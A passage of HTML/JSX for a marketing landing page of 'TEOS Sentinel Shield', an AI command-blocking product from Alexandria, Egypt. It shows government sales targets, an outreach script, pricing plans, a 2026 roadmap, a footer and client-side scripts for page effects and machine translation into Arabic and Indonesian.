          <div class="feat-icon">🏙️</div>
          <div class="feat-cmd">Tier 2 — Mega Projects</div>
          <div class="feat-title">NEOM</div>
          <p class="feat-desc">AI-native city. Autonomous systems everywhere. Every autonomous decision needs a kill-switch before execution. NEOM is the single most perfect product-market fit for TEOS in the world.</p>
          <div class="feat-tags"><span class="ftag">AI-native city</span><span class="ftag">autonomous systems</span><span class="ftag">kill-switch</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">Execution control for autonomous environments. Perfect fit.</div>
        </div>
        <div class="feat">
          <div class="feat-icon">📶</div>
          <div class="feat-cmd">Tier 2 — Enterprise Entry</div>
          <div class="feat-title">STC / STC Solutions</div>
          <p class="feat-desc">Saudi Telecom Company. Smart cities, enterprise AI, and major government contracts. Entry via enterprise → expand to government. Established procurement channel for technology products.</p>
          <div class="feat-tags"><span class="ftag">smart cities</span><span class="ftag">enterprise AI</span><span class="ftag">gov contracts</span></div>
          <div style="margin-top:16px;padding:12px 14px;background:rgba(201,168,76,0.06);border:1px solid var(--gold-dim);border-radius:2px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--gold-dim);line-height:1.6;">Enterprise entry → government expansion route.</div>
        </div>
      </div>
    </div>

    <!-- OUTREACH SCRIPT BOX -->
    <div class="reveal" style="margin-top:40px;border:1px solid var(--border3);border-left:3px solid var(--gold-dim);padding:28px 32px;background:rgba(201,168,76,0.02);">
      <div style="font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--gold-dim);margin-bottom:16px;">// Outreach Script — Use This Exact Language</div>
      <div style="font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--text-dim);line-height:2;border-left:2px solid var(--border3);padding-left:20px;">
        We provide a <span style="color:var(--text);">pre-execution enforcement layer</span> for AI systems.<br>
        It ensures unsafe commands are <span style="color:var(--red-bright);">blocked before execution</span> — enabling compliance, control, and auditability across AI workflows.<br><br>
        We are onboarding a limited number of <span style="color:var(--gold);">government pilots in MENA.</span><br>
        <span style="color:var(--text-muted);">Do NOT say: bot / scanner / SaaS. Say: execution control layer.</span>
      </div>
      <div style="margin-top:20px;display:flex;gap:12px;flex-wrap:wrap;">
        <a href="mailto:ayman@teosegypt.com?subject=TEOS Government Pilot Inquiry&body=We are interested in piloting the TEOS Sentinel execution control layer." class="btn-ent" style="font-size:12px;">Request Gov Pilot →</a>
        <a href="https://t.me/teoslinker_bot" class="btn-ent" style="font-size:12px;border-color:var(--border3);color:var(--text-dim);">Try the Engine First →</a>
      </div>
    </div>
  </div>
</section>

<!-- PRICING -->
<section class="pricing-section" id="pricing">
  <div class="pricing-inner">
    <div class="label reveal">// Plans</div>
    <h2 class="section-title reveal">Stay protected.<br>Choose your level.</h2>
    <p class="section-sub reveal">Instant activation. Credits auto-applied. Cancel anytime. All plans include full rule ID and explanation on every verdict.</p>
    <div class="pricing-grid reveal">
      <div class="plan">
        <div class="plan-name">🟦 Starter</div>
        <div class="plan-price"><span class="price-n">$9</span><span class="price-p">/month</span></div>
        <p class="plan-tag">For hobbyists and early testing</p>
        <ul class="plan-feats">
          <li>50 protected actions/month</li>
          <li>Code threat scanning (/scan)</li>
          <li>Full verdict + rule ID</li>
          <li>Community support</li>
          <li>7-day money-back guarantee</li>
        </ul>
        <a href="https://dodo.pe/tts" class="btn-plan btn-out">Get Started →</a>
      </div>
      <div class="plan pop">
        <div class="pop-badge">⭐ MOST POPULAR</div>
        <div class="plan-name">🟨 Builder</div>
        <div class="plan-price"><span class="price-n">$39</span><span class="price-p">/month</span></div>
        <p class="plan-tag">For indie devs and startups</p>
        <ul class="plan-feats">
          <li>400 protected actions/month</li>
          <li>Code + Dependency scanning</li>
          <li>CI/CD pipeline audit</li>
          <li>Priority analysis queue</li>
          <li>Full verdict + rule explanations</li>
          <li>7-day money-back guarantee</li>
        </ul>
        <a href="https://dodo.pe/tts2" class="btn-plan btn-gold">Get Protected →</a>
      </div>
      <div class="plan">
        <div class="plan-name">🟥 Pro</div>
        <div class="plan-price"><span class="price-n">$99</span><span class="price-p">/month</span></div>
        <p class="plan-tag">For teams and production agents</p>
        <ul class="plan-feats">
          <li>1,000 protected actions/month</li>
          <li>All scanning engines</li>
          <li>Advanced threat detection</li>
          <li>SLA support + early access</li>
          <li>Custom policy rules</li>
          <li>Full audit logs</li>
        </ul>
        <a href="https://dodo.pe/teos-pro" class="btn-plan btn-out">Go Pro →</a>
      </div>
    </div>
    <div class="enterprise-row reveal">
      <div>
        <div class="ent-h">🏢 Enterprise / Government Pilot</div>
        <p class="ent-p">Dedicated deployment · Custom policy engine · Audit logs · MENA sovereign architecture · ICBC constitutional alignment · Unlimited scans · Self-hosted option · Egypt / UAE / Saudi pilots open</p>
      </div>
      <a href="mailto:ayman@teosegypt.com" class="btn-ent">Request Pilot ($5K–$50K) →</a>
    </div>
  </div>
</section>

<!-- SOVEREIGN -->
<section class="sovereign-section">
  <div class="sovereign-copy reveal">
    <div class="label">// Built Different</div>
    <h2>From <em>Alexandria</em>.<br>For the sovereign AI future.</h2>
    <p>TEOS Sentinel is not built for Silicon Valley's threat model. It's built for autonomous AI systems operating in MENA, GCC, and emerging-market contexts — where data sovereignty, regulatory alignment, and government accountability are non-negotiable.</p>
    <p>Aligned with the TEOS International Civic Blockchain Constitution (ICBC). Attending Consensus Hong Kong 2026 and Consensus Miami 2026.</p>
    <p style="color:var(--text);">Law governs execution. Humans govern systems. AI serves authority.</p>
    <div class="sovereign-pills">
      <span class="spill">MENA Sovereign Architecture</span>
      <span class="spill">ICBC Constitutional Alignment</span>
      <span class="spill">Elmahrosa International</span>
      <span class="spill">Alexandria, Egypt</span>
      <span class="spill">Elmahrosapi · 75+ Countries</span>
      <span class="spill">Consensus HK 2026</span>
      <span class="spill">Consensus Miami 2026</span>
    </div>
  </div>
  <div class="sovereign-metrics reveal">
    <div class="smet"><div class="smet-n">75+</div><div class="smet-l">Countries in community</div></div>
    <div class="smet"><div class="smet-n">528</div><div class="smet-l">Community members</div></div>
    <div class="smet"><div class="smet-n">3</div><div class="smet-l">Active scan engines</div></div>
    <div class="smet"><div class="smet-n">v2.0</div><div class="smet-l">Engine — production stable</div></div>
  </div>
</section>

<!-- ROADMAP -->
<section class="roadmap-section" id="roadmap">
  <div class="roadmap-inner">
    <div class="label reveal">// 2026 Roadmap</div>
    <h2 class="section-title reveal">What's <em style="font-style:italic;color:var(--gold)">next.</em></h2>
    <p class="section-sub reveal">Attending Consensus Hong Kong 2026 and Consensus Miami 2026. <a href="mailto:ayman@teosegypt.com" style="color:var(--gold);text-decoration:none;">Book a meeting →</a></p>
    <div class="roadmap-grid reveal">
      <div class="rm-card live">
        <div class="rm-q live-q"><span class="rm-dot"></span>LIVE NOW</div>
        <div class="rm-title">Core Scan Engine v2 + Telegram Bot</div>
        <p class="rm-desc">25 named rules. 37 passing tests. /scan, /deps, /ci — all live. Engine v2 production stable.</p>
      </div>
      <div class="rm-card">
        <div class="rm-q">Q2 2026</div>
        <div class="rm-title">Government Pilot Program — Egypt + UAE</div>
        <p class="rm-desc">ITIDA, MCIT, UAE AI Office pilots. First institutional contracts. Sovereign deployment package.</p>
      </div>
      <div class="rm-card">
        <div class="rm-q">Q3 2026</div>
        <div class="rm-title">Policy Engine UI + GitHub App</div>
        <p class="rm-desc">Enterprise self-service. Custom threat rules per org. Auto-scan on push with BLOCK alerts.</p>
      </div>
      <div class="rm-card">
        <div class="rm-q">Q4 2026</div>
        <div class="rm-title">Saudi Expansion — SDAIA / NEOM</div>
        <p class="rm-desc">Full sovereign deployment. NEOM autonomous systems integration. SDAIA compliance audit trail.</p>
      </div>
    </div>
  </div>
</section>

<!-- FINAL CTA -->
<section class="final-cta">
  <h2>Start free.<br><em>Block the first threat</em><br>in 60 seconds.</h2>
  <p>Open Telegram. Message @teoslinker_bot. Paste your first command. Get your verdict. No account. No credit card. No waiting.</p>
  <div class="final-btns">
    <a href="https://t.me/teoslinker_bot" class="btn-primary">⚡ Open @teoslinker_bot →</a>
    <a href="mailto:ayman@teosegypt.com" class="btn-secondary">Enterprise / Gov inquiry →</a>
  </div>
</section>

<!-- FOOTER -->
<footer>
  <div class="footer-inner">
    <div>
      <div class="foot-brand-name">🛡️ TEOS SENTINEL SHIELD</div>
      <p class="foot-brand-desc">Execution Control Infrastructure for Autonomous AI.<br>Built in Alexandria, Egypt by Elmahrosa International.<br>Law governs execution. Humans govern systems. AI serves authority.</p>
      <a href="mailto:ayman@teosegypt.com" class="foot-contact">ayman@teosegypt.com</a>
    </div>
    <div class="foot-col">
      <h5>Product</h5>
      <ul>
        <li><a href="https://t.me/teoslinker_bot">Telegram Bot</a></li>
        <li><a href="#features">Features</a></li>
        <li><a href="#pricing">Pricing</a></li>
        <li><a href="https://github.com/Elmahrosa/teos-sentinel-shield">GitHub</a></li>
      </ul>
    </div>
    <div class="foot-col">
      <h5>Community</h5>
      <ul>
        <li><a href="https://t.me/Elmahrosapi">Elmahrosapi (75+ countries)</a></li>
        <li><a href="https://linkedin.com/in/aymanseif">Founder LinkedIn</a></li>
        <li><a href="https://linkedin.com/company/teos-pharaoh-portal">Company Page</a></li>
        <li><a href="https://x.com/king_teos">X / Twitter</a></li>
      </ul>
    </div>
    <div class="foot-col">
      <h5>Government</h5>
      <ul>
        <li><a href="mailto:ayman@teosegypt.com">Egypt Pilot (ITIDA)</a></li>
        <li><a href="mailto:ayman@teosegypt.com">UAE Pilot (AI Office)</a></li>
        <li><a href="mailto:ayman@teosegypt.com">Saudi Pilot (SDAIA)</a></li>
        <li><a href="https://github.com/Elmahrosa/Teos-International-Civic-Blockchain-Constitution">ICBC Constitution</a></li>
      </ul>
    </div>
  </div>
  <div class="footer-bottom">
    <span>© 2026 Elmahrosa International · Alexandria, Egypt · Engine v2.0</span>
    <span>Law governs execution. Humans govern systems. AI serves authority.</span>
  </div>
</footer>

<style>
.gov-panel { transition: opacity 0.3s ease; }
</style>

<script>
// ── Scroll reveal
const obs = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) { e.target.classList.add('visible'); obs.unobserve(e.target); }
  });
}, { threshold: 0.08 });
document.querySelectorAll('.reveal').forEach(el => obs.observe(el));

// ── Animated counters
const counterEls = document.querySelectorAll('[data-target]');
const counterObs = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (!e.isIntersecting) return;
    const el = e.target;
    const target = parseInt(el.dataset.target);
    let current = 0;
    const step = target / 50;
    const timer = setInterval(() => {
      current += step;
      if (current >= target) { el.textContent = target; clearInterval(timer); }
      else { el.textContent = Math.floor(current); }
    }, 24);
    counterObs.unobserve(el);
  });
}, { threshold: 0.5 });
counterEls.forEach(el => counterObs.observe(el));

// ── Nav active on scroll
const sections = document.querySelectorAll('section[id]');
const navLinks = document.querySelectorAll('.nav-links a[href^="#"]');
const secObs = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      navLinks.forEach(a => a.style.color = '');
      const active = document.querySelector(\`.nav-links a[href="#\${e.target.id}"]\`);
      if (active) active.style.color = 'var(--gold)';
    }
  });
}, { threshold: 0.4 });
sections.forEach(s => secObs.observe(s));

// ── Video tabs
function setTab(btn, tab) {
  document.querySelectorAll('.video-tabs .vtab').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  // tabs just change label for now; swap iframe src when you have per-tab videos
}

// ── Government country tabs
function setGovTab(btn, country) {
  document.querySelectorAll('#government .vtab').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  document.querySelectorAll('.gov-panel').forEach(p => p.style.display = 'none');
  const panel = document.getElementById('gov-' + country);
  if (panel) { panel.style.display = 'block'; panel.classList.add('visible'); }
}
</script>

<script>
// ════════════════════════════════════════════
// TEOS SENTINEL — AUTO TRANSLATE ENGINE
// Supports: English (en), Arabic (ar), Indonesian (id)
// Uses: Google Translate API (free tier, no key needed via element method)
// Fallback: Built-in translation strings for critical UI text
// ════════════════════════════════════════════

const TRANSLATIONS = {
  ar: {
    // NAV
    'Demo': 'عرض',
    'Features': 'المميزات',
    'Compare': 'مقارنة',
    'Pricing': 'الأسعار',
    'Roadmap': 'خارطة الطريق',
    'Try Free →': 'جرب مجاناً →',
    // STATUS BAR
    'MCP Engine v2.0 — Online': 'محرك MCP v2.0 — متصل',
    'Telegram Bot — Online': 'بوت تيليغرام — متصل',
    '25 Named Rules Active': '25 قاعدة أمان نشطة',
    '37 Tests Passing': '37 اختبار ناجح',
    // HERO
    'Engine v2 Stable · Alexandria, Egypt · 75+ Countries': 'محرك v2 مستقر · الإسكندرية، مصر · أكثر من 75 دولة',
    'We decide what executes.': 'نحن نقرر ما يُنفَّذ.',
    '5 free scans · no signup · no credit card · Telegram instant': '5 فحوصات مجانية · بدون تسجيل · بدون بطاقة ائتمان · تيليغرام فوري',
    'Named threat rules': 'قاعدة تهديد مسماة',
    'Tests passing': 'اختبار ناجح',
    'countries reached': 'دولة وصلنا إليها',
    'community members': 'عضو في المجتمع',
    // SECTIONS
    '// Live Demo': '// عرض مباشر',
    '// Live Verdicts': '// أحكام مباشرة',
    '// Architecture': '// البنية التقنية',
    '// Scan Engines': '// محركات الفحص',
    '// Competitive Edge': '// الميزة التنافسية',
    '// Government Pipeline': '// مسار الحكومات',
    '// Plans': '// الباقات',
    '// Built Different': '// بُني بشكل مختلف',
    '// 2026 Roadmap': '// خارطة طريق 2026',
    // DEMO SECTION
    'See TEOS block a real threat': 'شاهد TEOS يحجب تهديداً حقيقياً',
    'in under 2 seconds.': 'في أقل من ثانيتين.',
    'Full Product Demo': 'عرض كامل للمنتج',
    'Code Scan — /scan': 'فحص الكود — /scan',
    'Deps Audit — /deps': 'مراجعة التبعيات — /deps',
    'CI/CD — /ci': 'CI/CD — /ci',
    // PRICING
    'Stay protected.': 'ابقَ محمياً.',
    'Choose your level.': 'اختر مستواك.',
    'Instant activation. Credits auto-applied. Cancel anytime.': 'تفعيل فوري. رصيد تلقائي. إلغاء في أي وقت.',
    'Get Started →': 'ابدأ الآن →',
    'Get Protected →': 'احصل على الحماية →',
    'Go Pro →': 'انتقل إلى Pro →',
    'Request Pilot ($5K–$50K) →': 'طلب تجربة تجريبية ($5K–$50K) →',
    // CTA
    'Start free.': 'ابدأ مجاناً.',
    'in 60 seconds.': 'في 60 ثانية.',
    'Enterprise / Gov inquiry →': 'استفسار مؤسسي / حكومي →',
    // GOVERNMENT
    '🇪🇬 Egypt — Start Here': '🇪🇬 مصر — ابدأ هنا',
    '🇦🇪 UAE — Fast Track': '🇦🇪 الإمارات — المسار السريع',
    '🇸🇦 Saudi — Big Money': '🇸🇦 السعودية — العقود الكبيرة',
    'Request Gov Pilot →': 'طلب تجربة حكومية →',
    'Try the Engine First →': 'جرب المحرك أولاً →',
  },

  id: {
    // NAV
    'Demo': 'Demo',
    'Features': 'Fitur',
    'Compare': 'Bandingkan',
    'Pricing': 'Harga',
    'Roadmap': 'Peta Jalan',
    'Try Free →': 'Coba Gratis →',
    // STATUS BAR
    'MCP Engine v2.0 — Online': 'Mesin MCP v2.0 — Online',
    'Telegram Bot — Online': 'Bot Telegram — Online',
    '25 Named Rules Active': '25 Aturan Keamanan Aktif',
    '37 Tests Passing': '37 Tes Berhasil',
    // HERO
    'Engine v2 Stable · Alexandria, Egypt · 75+ Countries': 'Engine v2 Stabil · Alexandria, Mesir · 75+ Negara',
    'We decide what executes.': 'Kami yang menentukan apa yang dijalankan.',
    '5 free scans · no signup · no credit card · Telegram instant': '5 pemindaian gratis · tanpa daftar · tanpa kartu kredit · instan via Telegram',
    'Named threat rules': 'Aturan ancaman bernama',
    'Tests passing': 'Tes berhasil',
    'countries reached': 'negara terjangkau',
    'community members': 'anggota komunitas',
    // SECTIONS
    '// Live Demo': '// Demo Langsung',
    '// Live Verdicts': '// Putusan Langsung',
    '// Architecture': '// Arsitektur',
    '// Scan Engines': '// Mesin Pemindaian',
    '// Competitive Edge': '// Keunggulan Kompetitif',
    '// Government Pipeline': '// Pipeline Pemerintah',
    '// Plans': '// Paket',
    '// Built Different': '// Dibangun Berbeda',
    '// 2026 Roadmap': '// Peta Jalan 2026',
    // DEMO
    'See TEOS block a real threat': 'Lihat TEOS memblokir ancaman nyata',
    'in under 2 seconds.': 'dalam kurang dari 2 detik.',
    'Full Product Demo': 'Demo Produk Lengkap',
    'Code Scan — /scan': 'Pemindaian Kode — /scan',
    'Deps Audit — /deps': 'Audit Dependensi — /deps',
    'CI/CD — /ci': 'CI/CD — /ci',
    // PRICING
    'Stay protected.': 'Tetap terlindungi.',
    'Choose your level.': 'Pilih tingkatan Anda.',
    'Instant activation. Credits auto-applied. Cancel anytime.': 'Aktivasi instan. Kredit otomatis. Batalkan kapan saja.',
    'Get Started →': 'Mulai Sekarang →',
    'Get Protected →': 'Dapatkan Perlindungan →',
    'Go Pro →': 'Tingkatkan ke Pro →',
    'Request Pilot ($5K–$50K) →': 'Minta Pilot ($5K–$50K) →',
    // CTA
    'Start free.': 'Mulai gratis.',
    'in 60 seconds.': 'dalam 60 detik.',
    'Enterprise / Gov inquiry →': 'Pertanyaan Enterprise / Pemerintah →',
    // GOVERNMENT
    '🇪🇬 Egypt — Start Here': '🇪🇬 Mesir — Mulai Di Sini',
    '🇦🇪 UAE — Fast Track': '🇦🇪 UEA — Jalur Cepat',
    '🇸🇦 Saudi — Big Money': '🇸🇦 Saudi — Kontrak Besar',
    'Request Gov Pilot →': 'Minta Pilot Pemerintah →',
    'Try the Engine First →': 'Coba Mesinnya Dulu →',
  }
};

// Nodes that should be translated (text nodes only, not code/terminal blocks)
const SKIP_SELECTORS = ['.term-body', '.term-name', 'code', 'pre', '.threat-ticker', '.tick-item', '.engine-stats', '.video-timeline', '.record-hint', 'script', 'style'];

let currentLang = 'en';
let originalTexts = new Map();
let translationCache = {};

function shouldSkip(node) {
  let el = node.parentElement;
  while (el) {
    for (const sel of SKIP_SELECTORS) {
      try { if (el.matches(sel)) return true; } catch(e) {}
    }
    el = el.parentElement;
  }
  return false;
}

function getTextNodes(root) {
  const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, {
    acceptNode(node) {
      const text = node.textContent.trim();
      if (!text || text.length < 2) return NodeFilter.FILTER_REJECT;
      if (shouldSkip(node)) return NodeFilter.FILTER_REJECT;
      return NodeFilter.FILTER_ACCEPT;
    }
  });
  const nodes = [];
  let n;
  while ((n = walker.nextNode())) nodes.push(n);
  return nodes;
}

// Store originals
function storeOriginals() {
  getTextNodes(document.body).forEach((node, i) => {
    const key = 'node_' + i;
    node._teosTKey = key;
    originalTexts.set(key, node.textContent);
  });
}

function showBar(pct) {
  const bar = document.getElementById('translateBar');
  const fill = document.getElementById('translateFill');
  bar.style.display = 'block';
  fill.style.width = pct + '%';
  if (pct >= 100) {
    setTimeout(() => { bar.style.display = 'none'; fill.style.width = '0%'; }, 500);
  }
}

function showToast(flag, msg) {
  const toast = document.getElementById('translateToast');
  document.getElementById('toastFlag').textContent = flag;
  document.getElementById('toastMsg').textContent = msg;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2500);
}

// Google Translate free API (no key, uses translate.googleapis.com)
async function googleTranslate(texts, targetLang) {
  const results = [];
  // batch in groups of 20 to stay safe
  const batchSize = 20;
  for (let i = 0; i < texts.length; i += batchSize) {
    const batch = texts.slice(i, i + batchSize);
    const query = batch.map(t => encodeURIComponent(t)).join('&q=');
    try {
      const url = \`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=\${targetLang}&dt=t&q=\${encodeURIComponent(batch.join('
|||
'))}\`;
      const resp = await fetch(url);
      const data = await resp.json();
      // Parse response: data[0] is array of [translated, original, ...]
      const combined = data[0].map(seg => seg[0]).join('');
      const parts = combined.split('|||').map(s => s.trim());
      parts.forEach((p, idx) => results.push(p || batch[idx]));
    } catch (e) {
      // Fallback: return originals
      batch.forEach(t => results.push(t));
    }
    showBar(Math.min(90, Math.round(((i + batchSize) / texts.length) * 90)));
    await new Promise(r => setTimeout(r, 100)); // small delay between batches
  }
  return results;
}

async function switchLang(lang, flag, label, isRtl) {
  if (lang === currentLang) { closeLangMenu(); return; }

  // Update button
  document.getElementById('currentFlag').textContent = flag;
  document.getElementById('currentLangLabel').textContent = label;
  document.querySelectorAll('.lang-option').forEach(o => o.classList.remove('active'));
  document.getElementById('opt-' + lang).classList.add('active');

  // RTL toggle
  document.documentElement.setAttribute('dir', isRtl ? 'rtl' : 'ltr');
  document.documentElement.setAttribute('lang', lang);

  closeLangMenu();

  if (lang === 'en') {
    // Restore originals
    getTextNodes(document.body).forEach(node => {
      if (node._teosTKey && originalTexts.has(node._teosTKey)) {
        node.textContent = originalTexts.get(node._teosTKey);
      }
    });
    currentLang = 'en';
    showToast('🇺🇸', 'Switched to English');
    return;
  }

  const cacheKey = lang;
  showBar(10);
  showToast(flag, lang === 'ar' ? 'جاري الترجمة...' : 'Menerjemahkan...');

  // Collect text nodes
  const nodes = getTextNodes(document.body);

  // Check built-in translations first, use Google for the rest
  const builtIn = TRANSLATIONS[lang] || {};
  const needsGoogle = [];
  const nodeIndexes = [];

  nodes.forEach((node, i) => {
    const orig = originalTexts.get(node._teosTKey) || node.textContent;
    if (builtIn[orig.trim()]) {
      node.textContent = builtIn[orig.trim()];
    } else if (orig.trim().length > 3) {
      needsGoogle.push(orig);
      nodeIndexes.push(i);
    }
  });

  showBar(30);

  // Google translate remainder
  if (needsGoogle.length > 0) {
    // Check cache
    const toCacheKey = needsGoogle.join('|||') + '__' + lang;
    let translations;
    if (translationCache[toCacheKey]) {
      translations = translationCache[toCacheKey];
    } else {
      translations = await googleTranslate(needsGoogle, lang);
      translationCache[toCacheKey] = translations;
    }
    nodeIndexes.forEach((nodeIdx, i) => {
      if (translations[i]) nodes[nodeIdx].textContent = translations[i];
    });
  }

  showBar(100);
  currentLang = lang;
  const doneMsg = lang === 'ar' ? 'تمت الترجمة إلى العربية ✓' : 'Diterjemahkan ke Bahasa Indonesia ✓';
  showToast(flag, doneMsg);
}

function toggleLangMenu(e) {
  e.stopPropagation();
  const btn = document.getElementById('langBtn');
  const dd = document.getElementById('langDropdown');
  btn.classList.toggle('open');
  dd.classList.toggle('open');
}

function closeLangMenu() {
  document.getElementById('langBtn').classList.remove('open');
  document.getElementById('langDropdown').classList.remove('open');
}

document.addEventListener('click', (e) => {
  if (!document.getElementById('langSwitcher').contains(e.target)) closeLangMenu();
});

// Init: store originals after page load
window.addEventListener('load', () => {
  setTimeout(storeOriginals, 500);
});
</script>
</body>
</html>`
      }}
    />
  );
}
